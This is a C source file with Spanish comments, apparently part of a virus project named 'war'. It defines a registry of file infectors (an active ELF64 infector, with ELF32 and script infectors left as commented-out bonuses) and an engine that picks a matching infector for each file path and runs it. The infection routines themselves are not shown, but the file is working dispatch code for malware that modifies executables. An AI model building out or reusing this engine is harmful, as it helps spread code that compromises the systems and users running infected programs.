#include "../../include/infector.h"
#include "../../include/war.h"
#include <stdio.h>

// BONUS 1: declaraciones para ELF32 (implementar después)
// extern bool is_elf32_file(const char *filepath);
// extern int infect_elf32(const char *filepath, t_config *cfg);

// BONUS 3: declaraciones para scripts (implementar después)
// extern bool is_script_file(const char *filepath);
// extern int infect_script(const char *filepath, t_config *cfg);

// Registro de infectores disponibles
t_infector g_infectors[] = {
    {
        .name = "ELF64",
        .can_infect = is_elf64_file,
        .infect = infect_elf64,
        .enabled = true
    },
    // BONUS 1: descomentar cuando esté listo
    // {
    //     .name = "ELF32",
    //     .can_infect = is_elf32_file,
    //     .infect = infect_elf32,
    //     .enabled = false  // Activar con cfg->enable_32bit
    // },
    // BONUS 3: descomentar cuando esté listo
    // {
    //     .name = "Script",
    //     .can_infect = is_script_file,
    //     .infect = infect_script,
    //     .enabled = false  // Activar con cfg->enable_scripts
    // },
};

const int g_num_infectors = sizeof(g_infectors) / sizeof(g_infectors[0]);

int infector_engine_run(const char *filepath, t_config *cfg) {
    if (!filepath || !cfg) return -1;

    // Iterar sobre todos los infectores registrados
    for (int i = 0; i < g_num_infectors; i++) {
        t_infector *inf = &g_infectors[i];

        // Saltar si está deshabilitado
        if (!inf->enabled) continue;
        
        // Verificar si este infector puede manejar el archivo
        if (inf->can_infect(filepath)) {
            return inf->infect(filepath, cfg);
        }
    }
    
    // Ningún infector compatible
    return -1;
}

const char *infector_get_type_name(const char *filepath) {
    for (int i = 0; i < g_num_infectors; i++) {
        if (g_infectors[i].can_infect(filepath)) {
            return g_infectors[i].name;
        }
    }
    return "Unknown";
}